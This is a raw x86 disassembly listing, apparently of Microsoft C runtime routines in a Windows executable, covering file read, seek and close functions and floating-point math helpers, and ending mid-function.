  409de9:	c1 fb 06             	sar    $0x6,%ebx
  409dec:	8b c6                	mov    %esi,%eax
  409dee:	83 e0 3f             	and    $0x3f,%eax
  409df1:	6b c8 30             	imul   $0x30,%eax,%ecx
  409df4:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  409df7:	8b 04 9d 90 4f 41 00 	mov    0x414f90(,%ebx,4),%eax
  409dfe:	0f b6 44 08 28       	movzbl 0x28(%eax,%ecx,1),%eax
  409e03:	83 e0 01             	and    $0x1,%eax
  409e06:	74 69                	je     0x409e71
  409e08:	56                   	push   %esi
  409e09:	e8 15 d3 ff ff       	call   0x407123
  409e0e:	59                   	pop    %ecx
  409e0f:	83 cf ff             	or     $0xffffffff,%edi
  409e12:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  409e15:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  409e19:	8b 04 9d 90 4f 41 00 	mov    0x414f90(,%ebx,4),%eax
  409e20:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  409e23:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
  409e28:	75 15                	jne    0x409e3f
  409e2a:	e8 ca bd ff ff       	call   0x405bf9
  409e2f:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  409e35:	e8 ac bd ff ff       	call   0x405be6
  409e3a:	83 20 00             	andl   $0x0,(%eax)
  409e3d:	eb 14                	jmp    0x409e53
  409e3f:	ff 75 10             	push   0x10(%ebp)
  409e42:	ff 75 0c             	push   0xc(%ebp)
  409e45:	56                   	push   %esi
  409e46:	e8 47 00 00 00       	call   0x409e92
  409e4b:	83 c4 0c             	add    $0xc,%esp
  409e4e:	8b f8                	mov    %eax,%edi
  409e50:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  409e53:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  409e5a:	e8 0a 00 00 00       	call   0x409e69
  409e5f:	8b c7                	mov    %edi,%eax
  409e61:	eb 29                	jmp    0x409e8c
  409e63:	8b 75 08             	mov    0x8(%ebp),%esi
  409e66:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  409e69:	56                   	push   %esi
  409e6a:	e8 d7 d2 ff ff       	call   0x407146
  409e6f:	59                   	pop    %ecx
  409e70:	c3                   	ret
  409e71:	e8 70 bd ff ff       	call   0x405be6
  409e76:	83 20 00             	andl   $0x0,(%eax)
  409e79:	e8 7b bd ff ff       	call   0x405bf9
  409e7e:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  409e84:	e8 b4 bc ff ff       	call   0x405b3d
  409e89:	83 c8 ff             	or     $0xffffffff,%eax
  409e8c:	e8 5f 7d ff ff       	call   0x401bf0
  409e91:	c3                   	ret
  409e92:	8b ff                	mov    %edi,%edi
  409e94:	55                   	push   %ebp
  409e95:	8b ec                	mov    %esp,%ebp
  409e97:	83 ec 30             	sub    $0x30,%esp
  409e9a:	a1 00 40 41 00       	mov    0x414000,%eax
  409e9f:	33 c5                	xor    %ebp,%eax
  409ea1:	89 45 fc             	mov    %eax,-0x4(%ebp)
  409ea4:	8b 4d 10             	mov    0x10(%ebp),%ecx
  409ea7:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  409eaa:	56                   	push   %esi
  409eab:	8b 75 08             	mov    0x8(%ebp),%esi
  409eae:	57                   	push   %edi
  409eaf:	8b 7d 0c             	mov    0xc(%ebp),%edi
  409eb2:	89 7d d0             	mov    %edi,-0x30(%ebp)
  409eb5:	85 c9                	test   %ecx,%ecx
  409eb7:	75 07                	jne    0x409ec0
  409eb9:	33 c0                	xor    %eax,%eax
  409ebb:	e9 ce 01 00 00       	jmp    0x40a08e
  409ec0:	85 ff                	test   %edi,%edi
  409ec2:	75 1f                	jne    0x409ee3
  409ec4:	e8 1d bd ff ff       	call   0x405be6
  409ec9:	21 38                	and    %edi,(%eax)
  409ecb:	e8 29 bd ff ff       	call   0x405bf9
  409ed0:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  409ed6:	e8 62 bc ff ff       	call   0x405b3d
  409edb:	83 c8 ff             	or     $0xffffffff,%eax
  409ede:	e9 ab 01 00 00       	jmp    0x40a08e
  409ee3:	53                   	push   %ebx
  409ee4:	8b c6                	mov    %esi,%eax
  409ee6:	8b de                	mov    %esi,%ebx
  409ee8:	c1 fb 06             	sar    $0x6,%ebx
  409eeb:	83 e0 3f             	and    $0x3f,%eax
  409eee:	6b d0 30             	imul   $0x30,%eax,%edx
  409ef1:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  409ef4:	8b 04 9d 90 4f 41 00 	mov    0x414f90(,%ebx,4),%eax
  409efb:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  409efe:	89 55 e8             	mov    %edx,-0x18(%ebp)
  409f01:	8a 5c 10 29          	mov    0x29(%eax,%edx,1),%bl
  409f05:	80 fb 02             	cmp    $0x2,%bl
  409f08:	74 05                	je     0x409f0f
  409f0a:	80 fb 01             	cmp    $0x1,%bl
  409f0d:	75 28                	jne    0x409f37
  409f0f:	8b c1                	mov    %ecx,%eax
  409f11:	f7 d0                	not    %eax
  409f13:	a8 01                	test   $0x1,%al
  409f15:	75 1d                	jne    0x409f34
  409f17:	e8 ca bc ff ff       	call   0x405be6
  409f1c:	83 20 00             	andl   $0x0,(%eax)
  409f1f:	e8 d5 bc ff ff       	call   0x405bf9
  409f24:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  409f2a:	e8 0e bc ff ff       	call   0x405b3d
  409f2f:	e9 51 01 00 00       	jmp    0x40a085
  409f34:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  409f37:	f6 44 10 28 20       	testb  $0x20,0x28(%eax,%edx,1)
  409f3c:	74 0f                	je     0x409f4d
  409f3e:	6a 02                	push   $0x2
  409f40:	6a 00                	push   $0x0
  409f42:	6a 00                	push   $0x0
  409f44:	56                   	push   %esi
  409f45:	e8 41 04 00 00       	call   0x40a38b
  409f4a:	83 c4 10             	add    $0x10,%esp
  409f4d:	56                   	push   %esi
  409f4e:	e8 e4 fa ff ff       	call   0x409a37
  409f53:	59                   	pop    %ecx
  409f54:	84 c0                	test   %al,%al
  409f56:	74 39                	je     0x409f91
  409f58:	84 db                	test   %bl,%bl
  409f5a:	74 22                	je     0x409f7e
  409f5c:	fe cb                	dec    %bl
  409f5e:	80 fb 01             	cmp    $0x1,%bl
  409f61:	0f 87 ee 00 00 00    	ja     0x40a055
  409f67:	ff 75 f8             	push   -0x8(%ebp)
  409f6a:	8d 45 ec             	lea    -0x14(%ebp),%eax
  409f6d:	57                   	push   %edi
  409f6e:	50                   	push   %eax
  409f6f:	e8 56 fa ff ff       	call   0x4099ca
  409f74:	83 c4 0c             	add    $0xc,%esp
  409f77:	8b f0                	mov    %eax,%esi
  409f79:	e9 9c 00 00 00       	jmp    0x40a01a
  409f7e:	ff 75 f8             	push   -0x8(%ebp)
  409f81:	8d 45 ec             	lea    -0x14(%ebp),%eax
  409f84:	57                   	push   %edi
  409f85:	56                   	push   %esi
  409f86:	50                   	push   %eax
  409f87:	e8 8b f8 ff ff       	call   0x409817
  409f8c:	83 c4 10             	add    $0x10,%esp
  409f8f:	eb e6                	jmp    0x409f77
  409f91:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  409f94:	8b 0c 85 90 4f 41 00 	mov    0x414f90(,%eax,4),%ecx
  409f9b:	8b 45 e8             	mov    -0x18(%ebp),%eax
  409f9e:	f6 44 01 28 80       	testb  $0x80,0x28(%ecx,%eax,1)
  409fa3:	74 46                	je     0x409feb
  409fa5:	0f be c3             	movsbl %bl,%eax
  409fa8:	83 e8 00             	sub    $0x0,%eax
  409fab:	74 2e                	je     0x409fdb
  409fad:	83 e8 01             	sub    $0x1,%eax
  409fb0:	74 19                	je     0x409fcb
  409fb2:	83 e8 01             	sub    $0x1,%eax
  409fb5:	0f 85 9a 00 00 00    	jne    0x40a055
  409fbb:	ff 75 f8             	push   -0x8(%ebp)
  409fbe:	8d 45 ec             	lea    -0x14(%ebp),%eax
  409fc1:	57                   	push   %edi
  409fc2:	56                   	push   %esi
  409fc3:	50                   	push   %eax
  409fc4:	e8 c3 fb ff ff       	call   0x409b8c
  409fc9:	eb c1                	jmp    0x409f8c
  409fcb:	ff 75 f8             	push   -0x8(%ebp)
  409fce:	8d 45 ec             	lea    -0x14(%ebp),%eax
  409fd1:	57                   	push   %edi
  409fd2:	56                   	push   %esi
  409fd3:	50                   	push   %eax
  409fd4:	e8 a1 fc ff ff       	call   0x409c7a
  409fd9:	eb b1                	jmp    0x409f8c
  409fdb:	ff 75 f8             	push   -0x8(%ebp)
  409fde:	8d 45 ec             	lea    -0x14(%ebp),%eax
  409fe1:	57                   	push   %edi
  409fe2:	56                   	push   %esi
  409fe3:	50                   	push   %eax
  409fe4:	e8 c4 fa ff ff       	call   0x409aad
  409fe9:	eb a1                	jmp    0x409f8c
  409feb:	8b 44 01 18          	mov    0x18(%ecx,%eax,1),%eax
  409fef:	33 c9                	xor    %ecx,%ecx
  409ff1:	51                   	push   %ecx
  409ff2:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  409ff5:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  409ff8:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  409ffb:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  409ffe:	51                   	push   %ecx
  409fff:	ff 75 f8             	push   -0x8(%ebp)
  40a002:	57                   	push   %edi
  40a003:	50                   	push   %eax
  40a004:	ff 15 b0 d0 40 00    	call   *0x40d0b0
  40a00a:	85 c0                	test   %eax,%eax
  40a00c:	75 09                	jne    0x40a017
  40a00e:	ff 15 74 d0 40 00    	call   *0x40d074
  40a014:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40a017:	8d 75 ec             	lea    -0x14(%ebp),%esi
  40a01a:	8d 7d d8             	lea    -0x28(%ebp),%edi
  40a01d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a01e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a01f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a020:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40a023:	85 c0                	test   %eax,%eax
  40a025:	75 63                	jne    0x40a08a
  40a027:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40a02a:	85 c0                	test   %eax,%eax
  40a02c:	74 24                	je     0x40a052
  40a02e:	6a 05                	push   $0x5
  40a030:	5e                   	pop    %esi
  40a031:	3b c6                	cmp    %esi,%eax
  40a033:	75 14                	jne    0x40a049
  40a035:	e8 bf bb ff ff       	call   0x405bf9
  40a03a:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40a040:	e8 a1 bb ff ff       	call   0x405be6
  40a045:	89 30                	mov    %esi,(%eax)
  40a047:	eb 3c                	jmp    0x40a085
  40a049:	50                   	push   %eax
  40a04a:	e8 74 bb ff ff       	call   0x405bc3
  40a04f:	59                   	pop    %ecx
  40a050:	eb 33                	jmp    0x40a085
  40a052:	8b 7d d0             	mov    -0x30(%ebp),%edi
  40a055:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40a058:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40a05b:	8b 04 85 90 4f 41 00 	mov    0x414f90(,%eax,4),%eax
  40a062:	f6 44 08 28 40       	testb  $0x40,0x28(%eax,%ecx,1)
  40a067:	74 09                	je     0x40a072
  40a069:	80 3f 1a             	cmpb   $0x1a,(%edi)
  40a06c:	75 04                	jne    0x40a072
  40a06e:	33 c0                	xor    %eax,%eax
  40a070:	eb 1b                	jmp    0x40a08d
  40a072:	e8 82 bb ff ff       	call   0x405bf9
  40a077:	c7 00 1c 00 00 00    	movl   $0x1c,(%eax)
  40a07d:	e8 64 bb ff ff       	call   0x405be6
  40a082:	83 20 00             	andl   $0x0,(%eax)
  40a085:	83 c8 ff             	or     $0xffffffff,%eax
  40a088:	eb 03                	jmp    0x40a08d
  40a08a:	2b 45 e0             	sub    -0x20(%ebp),%eax
  40a08d:	5b                   	pop    %ebx
  40a08e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40a091:	5f                   	pop    %edi
  40a092:	33 cd                	xor    %ebp,%ecx
  40a094:	5e                   	pop    %esi
  40a095:	e8 c4 71 ff ff       	call   0x40125e
  40a09a:	8b e5                	mov    %ebp,%esp
  40a09c:	5d                   	pop    %ebp
  40a09d:	c3                   	ret
  40a09e:	cc                   	int3
  40a09f:	cc                   	int3
  40a0a0:	83 3d e0 51 41 00 00 	cmpl   $0x0,0x4151e0
  40a0a7:	0f 84 82 00 00 00    	je     0x40a12f
  40a0ad:	83 ec 08             	sub    $0x8,%esp
  40a0b0:	0f ae 5c 24 04       	stmxcsr 0x4(%esp)
  40a0b5:	8b 44 24 04          	mov    0x4(%esp),%eax
  40a0b9:	25 80 7f 00 00       	and    $0x7f80,%eax
  40a0be:	3d 80 1f 00 00       	cmp    $0x1f80,%eax
  40a0c3:	75 0f                	jne    0x40a0d4
  40a0c5:	d9 3c 24             	fnstcw (%esp)
  40a0c8:	66 8b 04 24          	mov    (%esp),%ax
  40a0cc:	66 83 e0 7f          	and    $0x7f,%ax
  40a0d0:	66 83 f8 7f          	cmp    $0x7f,%ax
  40a0d4:	8d 64 24 08          	lea    0x8(%esp),%esp
  40a0d8:	75 55                	jne    0x40a12f
  40a0da:	e9 99 04 00 00       	jmp    0x40a578
  40a0df:	90                   	nop
  40a0e0:	83 3d e0 51 41 00 00 	cmpl   $0x0,0x4151e0
  40a0e7:	74 32                	je     0x40a11b
  40a0e9:	83 ec 08             	sub    $0x8,%esp
  40a0ec:	0f ae 5c 24 04       	stmxcsr 0x4(%esp)
  40a0f1:	8b 44 24 04          	mov    0x4(%esp),%eax
  40a0f5:	25 80 7f 00 00       	and    $0x7f80,%eax
  40a0fa:	3d 80 1f 00 00       	cmp    $0x1f80,%eax
  40a0ff:	75 0f                	jne    0x40a110
  40a101:	d9 3c 24             	fnstcw (%esp)
  40a104:	66 8b 04 24          	mov    (%esp),%ax
  40a108:	66 83 e0 7f          	and    $0x7f,%ax
  40a10c:	66 83 f8 7f          	cmp    $0x7f,%ax
  40a110:	8d 64 24 08          	lea    0x8(%esp),%esp
  40a114:	75 05                	jne    0x40a11b
  40a116:	e9 45 04 00 00       	jmp    0x40a560
  40a11b:	83 ec 0c             	sub    $0xc,%esp
  40a11e:	dd 14 24             	fstl   (%esp)
  40a121:	e8 52 0b 00 00       	call   0x40ac78
  40a126:	e8 0d 00 00 00       	call   0x40a138
  40a12b:	83 c4 0c             	add    $0xc,%esp
  40a12e:	c3                   	ret
  40a12f:	8d 54 24 04          	lea    0x4(%esp),%edx
  40a133:	e8 fd 0a 00 00       	call   0x40ac35
  40a138:	52                   	push   %edx
  40a139:	9b d9 3c 24          	fstcw  (%esp)
  40a13d:	74 4c                	je     0x40a18b
  40a13f:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40a143:	66 81 3c 24 7f 02    	cmpw   $0x27f,(%esp)
  40a149:	74 06                	je     0x40a151
  40a14b:	d9 2d e8 12 41 00    	fldcw  0x4112e8
  40a151:	a9 00 00 f0 7f       	test   $0x7ff00000,%eax
  40a156:	74 5e                	je     0x40a1b6
  40a158:	a9 00 00 00 80       	test   $0x80000000,%eax
  40a15d:	75 41                	jne    0x40a1a0
  40a15f:	d9 ec                	fldlg2
  40a161:	d9 c9                	fxch   %st(1)
  40a163:	d9 f1                	fyl2x
  40a165:	83 3d c8 51 41 00 00 	cmpl   $0x0,0x4151c8
  40a16c:	0f 85 1c 0b 00 00    	jne    0x40ac8e
  40a172:	8d 0d e0 10 41 00    	lea    0x4110e0,%ecx
  40a178:	ba 1b 00 00 00       	mov    $0x1b,%edx
  40a17d:	e9 19 0b 00 00       	jmp    0x40ac9b
  40a182:	a9 00 00 00 80       	test   $0x80000000,%eax
  40a187:	75 17                	jne    0x40a1a0
  40a189:	eb d4                	jmp    0x40a15f
  40a18b:	a9 ff ff 0f 00       	test   $0xfffff,%eax
  40a190:	75 1d                	jne    0x40a1af
  40a192:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  40a197:	75 16                	jne    0x40a1af
  40a199:	25 00 00 00 80       	and    $0x80000000,%eax
  40a19e:	74 c5                	je     0x40a165
  40a1a0:	dd d8                	fstp   %st(0)
  40a1a2:	db 2d a0 12 41 00    	fldt   0x4112a0
  40a1a8:	b8 01 00 00 00       	mov    $0x1,%eax
  40a1ad:	eb 22                	jmp    0x40a1d1
  40a1af:	e8 68 0a 00 00       	call   0x40ac1c
  40a1b4:	eb 1b                	jmp    0x40a1d1
  40a1b6:	a9 ff ff 0f 00       	test   $0xfffff,%eax
  40a1bb:	75 c5                	jne    0x40a182
  40a1bd:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  40a1c2:	75 be                	jne    0x40a182
  40a1c4:	dd d8                	fstp   %st(0)
  40a1c6:	db 2d 4a 12 41 00    	fldt   0x41124a
  40a1cc:	b8 02 00 00 00       	mov    $0x2,%eax
  40a1d1:	83 3d c8 51 41 00 00 	cmpl   $0x0,0x4151c8
  40a1d8:	0f 85 b0 0a 00 00    	jne    0x40ac8e
  40a1de:	8d 0d e0 10 41 00    	lea    0x4110e0,%ecx
  40a1e4:	ba 1b 00 00 00       	mov    $0x1b,%edx
  40a1e9:	e8 a9 0b 00 00       	call   0x40ad97
  40a1ee:	5a                   	pop    %edx
  40a1ef:	c3                   	ret
  40a1f0:	83 3d e0 51 41 00 00 	cmpl   $0x0,0x4151e0
  40a1f7:	0f 84 ee 0d 00 00    	je     0x40afeb
  40a1fd:	83 ec 08             	sub    $0x8,%esp
  40a200:	0f ae 5c 24 04       	stmxcsr 0x4(%esp)
  40a205:	8b 44 24 04          	mov    0x4(%esp),%eax
  40a209:	25 80 7f 00 00       	and    $0x7f80,%eax
  40a20e:	3d 80 1f 00 00       	cmp    $0x1f80,%eax
  40a213:	75 0f                	jne    0x40a224
  40a215:	d9 3c 24             	fnstcw (%esp)
  40a218:	66 8b 04 24          	mov    (%esp),%ax
  40a21c:	66 83 e0 7f          	and    $0x7f,%ax
  40a220:	66 83 f8 7f          	cmp    $0x7f,%ax
  40a224:	8d 64 24 08          	lea    0x8(%esp),%esp
  40a228:	0f 85 bd 0d 00 00    	jne    0x40afeb
  40a22e:	eb 00                	jmp    0x40a230
  40a230:	f3 0f 7e 44 24 04    	movq   0x4(%esp),%xmm0
  40a236:	66 0f 28 15 00 11 41 	movapd 0x411100,%xmm2
  40a23d:	00 
  40a23e:	66 0f 28 c8          	movapd %xmm0,%xmm1
  40a242:	66 0f 28 f8          	movapd %xmm0,%xmm7
  40a246:	66 0f 73 d0 34       	psrlq  $0x34,%xmm0
  40a24b:	66 0f 7e c0          	movd   %xmm0,%eax
  40a24f:	66 0f 54 05 20 11 41 	andpd  0x411120,%xmm0
  40a256:	00 
  40a257:	66 0f fa d0          	psubd  %xmm0,%xmm2
  40a25b:	66 0f d3 ca          	psrlq  %xmm2,%xmm1
  40a25f:	a9 00 08 00 00       	test   $0x800,%eax
  40a264:	74 4c                	je     0x40a2b2
  40a266:	3d ff 0b 00 00       	cmp    $0xbff,%eax
  40a26b:	7c 7d                	jl     0x40a2ea
  40a26d:	66 0f f3 ca          	psllq  %xmm2,%xmm1
  40a271:	3d 32 0c 00 00       	cmp    $0xc32,%eax
  40a276:	7f 0b                	jg     0x40a283
  40a278:	66 0f d6 4c 24 04    	movq   %xmm1,0x4(%esp)
  40a27e:	dd 44 24 04          	fldl   0x4(%esp)
  40a282:	c3                   	ret
  40a283:	66 0f 2e ff          	ucomisd %xmm7,%xmm7
  40a287:	7b 24                	jnp    0x40a2ad
  40a289:	ba ec 03 00 00       	mov    $0x3ec,%edx
  40a28e:	83 ec 10             	sub    $0x10,%esp
  40a291:	89 54 24 0c          	mov    %edx,0xc(%esp)
  40a295:	8b d4                	mov    %esp,%edx
  40a297:	83 c2 14             	add    $0x14,%edx
  40a29a:	89 54 24 08          	mov    %edx,0x8(%esp)
  40a29e:	89 54 24 04          	mov    %edx,0x4(%esp)
  40a2a2:	89 14 24             	mov    %edx,(%esp)
  40a2a5:	e8 29 0b 00 00       	call   0x40add3
  40a2aa:	83 c4 10             	add    $0x10,%esp
  40a2ad:	dd 44 24 04          	fldl   0x4(%esp)
  40a2b1:	c3                   	ret
  40a2b2:	f3 0f 7e 44 24 04    	movq   0x4(%esp),%xmm0
  40a2b8:	66 0f f3 ca          	psllq  %xmm2,%xmm1
  40a2bc:	66 0f 28 d8          	movapd %xmm0,%xmm3
  40a2c0:	66 0f c2 c1 06       	cmpnlepd %xmm1,%xmm0
  40a2c5:	3d ff 03 00 00       	cmp    $0x3ff,%eax
  40a2ca:	7c 25                	jl     0x40a2f1
  40a2cc:	3d 32 04 00 00       	cmp    $0x432,%eax
  40a2d1:	7f b0                	jg     0x40a283
  40a2d3:	66 0f 54 05 f0 10 41 	andpd  0x4110f0,%xmm0
  40a2da:	00 
  40a2db:	f2 0f 58 c8          	addsd  %xmm0,%xmm1
  40a2df:	66 0f d6 4c 24 04    	movq   %xmm1,0x4(%esp)
  40a2e5:	dd 44 24 04          	fldl   0x4(%esp)
  40a2e9:	c3                   	ret
  40a2ea:	dd 05 30 11 41 00    	fldl   0x411130
  40a2f0:	c3                   	ret
  40a2f1:	66 0f c2 1d 10 11 41 	cmpnlepd 0x411110,%xmm3
  40a2f8:	00 06 
  40a2fa:	66 0f 54 1d f0 10 41 	andpd  0x4110f0,%xmm3
  40a301:	00 
  40a302:	66 0f d6 5c 24 04    	movq   %xmm3,0x4(%esp)
  40a308:	dd 44 24 04          	fldl   0x4(%esp)
  40a30c:	c3                   	ret
  40a30d:	8b ff                	mov    %edi,%edi
  40a30f:	55                   	push   %ebp
  40a310:	8b ec                	mov    %esp,%ebp
  40a312:	51                   	push   %ecx
  40a313:	51                   	push   %ecx
  40a314:	56                   	push   %esi
  40a315:	8b 75 08             	mov    0x8(%ebp),%esi
  40a318:	57                   	push   %edi
  40a319:	56                   	push   %esi
  40a31a:	e8 db ce ff ff       	call   0x4071fa
  40a31f:	83 cf ff             	or     $0xffffffff,%edi
  40a322:	59                   	pop    %ecx
  40a323:	3b c7                	cmp    %edi,%eax
  40a325:	75 11                	jne    0x40a338
  40a327:	e8 cd b8 ff ff       	call   0x405bf9
  40a32c:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40a332:	8b c7                	mov    %edi,%eax
  40a334:	8b d7                	mov    %edi,%edx
  40a336:	eb 4d                	jmp    0x40a385
  40a338:	ff 75 14             	push   0x14(%ebp)
  40a33b:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  40a33e:	51                   	push   %ecx
  40a33f:	ff 75 10             	push   0x10(%ebp)
  40a342:	ff 75 0c             	push   0xc(%ebp)
  40a345:	50                   	push   %eax
  40a346:	ff 15 24 d0 40 00    	call   *0x40d024
  40a34c:	85 c0                	test   %eax,%eax
  40a34e:	75 0f                	jne    0x40a35f
  40a350:	ff 15 74 d0 40 00    	call   *0x40d074
  40a356:	50                   	push   %eax
  40a357:	e8 67 b8 ff ff       	call   0x405bc3
  40a35c:	59                   	pop    %ecx
  40a35d:	eb d3                	jmp    0x40a332
  40a35f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40a362:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40a365:	23 c2                	and    %edx,%eax
  40a367:	3b c7                	cmp    %edi,%eax
  40a369:	74 c7                	je     0x40a332
  40a36b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40a36e:	8b ce                	mov    %esi,%ecx
  40a370:	83 e6 3f             	and    $0x3f,%esi
  40a373:	c1 f9 06             	sar    $0x6,%ecx
  40a376:	6b f6 30             	imul   $0x30,%esi,%esi
  40a379:	8b 0c 8d 90 4f 41 00 	mov    0x414f90(,%ecx,4),%ecx
  40a380:	80 64 31 28 fd       	andb   $0xfd,0x28(%ecx,%esi,1)
  40a385:	5f                   	pop    %edi
  40a386:	5e                   	pop    %esi
  40a387:	8b e5                	mov    %ebp,%esp
  40a389:	5d                   	pop    %ebp
  40a38a:	c3                   	ret
  40a38b:	8b ff                	mov    %edi,%edi
  40a38d:	55                   	push   %ebp
  40a38e:	8b ec                	mov    %esp,%ebp
  40a390:	ff 75 14             	push   0x14(%ebp)
  40a393:	ff 75 10             	push   0x10(%ebp)
  40a396:	ff 75 0c             	push   0xc(%ebp)
  40a399:	ff 75 08             	push   0x8(%ebp)
  40a39c:	e8 6c ff ff ff       	call   0x40a30d
  40a3a1:	83 c4 10             	add    $0x10,%esp
  40a3a4:	5d                   	pop    %ebp
  40a3a5:	c3                   	ret
  40a3a6:	8b ff                	mov    %edi,%edi
  40a3a8:	55                   	push   %ebp
  40a3a9:	8b ec                	mov    %esp,%ebp
  40a3ab:	56                   	push   %esi
  40a3ac:	8b 75 08             	mov    0x8(%ebp),%esi
  40a3af:	85 f6                	test   %esi,%esi
  40a3b1:	75 15                	jne    0x40a3c8
  40a3b3:	e8 41 b8 ff ff       	call   0x405bf9
  40a3b8:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40a3be:	e8 7a b7 ff ff       	call   0x405b3d
  40a3c3:	83 c8 ff             	or     $0xffffffff,%eax
  40a3c6:	eb 51                	jmp    0x40a419
  40a3c8:	8b 46 0c             	mov    0xc(%esi),%eax
  40a3cb:	57                   	push   %edi
  40a3cc:	83 cf ff             	or     $0xffffffff,%edi
  40a3cf:	c1 e8 0d             	shr    $0xd,%eax
  40a3d2:	a8 01                	test   $0x1,%al
  40a3d4:	74 39                	je     0x40a40f
  40a3d6:	56                   	push   %esi
  40a3d7:	e8 29 ef ff ff       	call   0x409305
  40a3dc:	56                   	push   %esi
  40a3dd:	8b f8                	mov    %eax,%edi
  40a3df:	e8 aa f2 ff ff       	call   0x40968e
  40a3e4:	56                   	push   %esi
  40a3e5:	e8 41 e3 ff ff       	call   0x40872b
  40a3ea:	50                   	push   %eax
  40a3eb:	e8 5e 0d 00 00       	call   0x40b14e
  40a3f0:	83 c4 10             	add    $0x10,%esp
  40a3f3:	85 c0                	test   %eax,%eax
  40a3f5:	79 05                	jns    0x40a3fc
  40a3f7:	83 cf ff             	or     $0xffffffff,%edi
  40a3fa:	eb 13                	jmp    0x40a40f
  40a3fc:	83 7e 1c 00          	cmpl   $0x0,0x1c(%esi)
  40a400:	74 0d                	je     0x40a40f
  40a402:	ff 76 1c             	push   0x1c(%esi)
  40a405:	e8 5f b8 ff ff       	call   0x405c69
  40a40a:	83 66 1c 00          	andl   $0x0,0x1c(%esi)
  40a40e:	59                   	pop    %ecx
  40a40f:	56                   	push   %esi
  40a410:	e8 54 0e 00 00       	call   0x40b269
  40a415:	59                   	pop    %ecx
  40a416:	8b c7                	mov    %edi,%eax
  40a418:	5f                   	pop    %edi
  40a419:	5e                   	pop    %esi
  40a41a:	5d                   	pop    %ebp
  40a41b:	c3                   	ret
  40a41c:	6a 10                	push   $0x10
  40a41e:	68 68 29 41 00       	push   $0x412968
  40a423:	e8 78 77 ff ff       	call   0x401ba0
  40a428:	8b 75 08             	mov    0x8(%ebp),%esi
  40a42b:	89 75 e0             	mov    %esi,-0x20(%ebp)
  40a42e:	33 c0                	xor    %eax,%eax
  40a430:	85 f6                	test   %esi,%esi
  40a432:	0f 95 c0             	setne  %al
  40a435:	85 c0                	test   %eax,%eax
  40a437:	75 15                	jne    0x40a44e
  40a439:	e8 bb b7 ff ff       	call   0x405bf9
  40a43e:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  40a444:	e8 f4 b6 ff ff       	call   0x405b3d
  40a449:	83 c8 ff             	or     $0xffffffff,%eax
  40a44c:	eb 3b                	jmp    0x40a489
  40a44e:	8b 46 0c             	mov    0xc(%esi),%eax
  40a451:	c1 e8 0c             	shr    $0xc,%eax
  40a454:	56                   	push   %esi
  40a455:	a8 01                	test   $0x1,%al
  40a457:	74 08                	je     0x40a461
  40a459:	e8 0b 0e 00 00       	call   0x40b269
  40a45e:	59                   	pop    %ecx
  40a45f:	eb e8                	jmp    0x40a449
  40a461:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  40a465:	e8 fb e3 ff ff       	call   0x408865
  40a46a:	59                   	pop    %ecx
  40a46b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40a46f:	56                   	push   %esi
  40a470:	e8 31 ff ff ff       	call   0x40a3a6
  40a475:	59                   	pop    %ecx
  40a476:	8b f0                	mov    %eax,%esi
  40a478:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40a47b:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40a482:	e8 0b 00 00 00       	call   0x40a492
  40a487:	8b c6                	mov    %esi,%eax
  40a489:	e8 62 77 ff ff       	call   0x401bf0
  40a48e:	c3                   	ret
  40a48f:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  40a492:	ff 75 e0             	push   -0x20(%ebp)
  40a495:	e8 df e3 ff ff       	call   0x408879
  40a49a:	59                   	pop    %ecx
  40a49b:	c3                   	ret
  40a49c:	cc                   	int3
  40a49d:	cc                   	int3
  40a49e:	cc                   	int3
  40a49f:	cc                   	int3
  40a4a0:	55                   	push   %ebp
  40a4a1:	8b ec                	mov    %esp,%ebp
  40a4a3:	57                   	push   %edi
  40a4a4:	56                   	push   %esi
  40a4a5:	53                   	push   %ebx
  40a4a6:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40a4a9:	0b c9                	or     %ecx,%ecx
  40a4ab:	74 4d                	je     0x40a4fa
  40a4ad:	8b 75 08             	mov    0x8(%ebp),%esi
  40a4b0:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40a4b3:	b7 41                	mov    $0x41,%bh
